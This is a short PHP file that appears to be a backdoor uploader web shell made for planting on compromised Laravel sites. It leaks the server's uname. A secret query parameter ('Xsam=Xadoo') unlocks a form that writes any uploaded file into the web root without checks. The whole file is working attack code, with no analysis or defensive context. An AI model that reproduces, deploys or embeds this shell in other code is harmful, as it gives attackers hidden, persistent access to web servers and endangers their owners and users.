<?php
echo "Coded By Xsam Xadoo - BoT laravel Auto Shell Upload\n ";
echo 'uname:'.php_uname()."\n"; 
$Sam = $_GET['Xsam'];
if($Sam == 'Xadoo'){ 
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {
	echo "Upload Success";
	} else {
	echo "Upload Failed Check permission";
	}
}
}
?>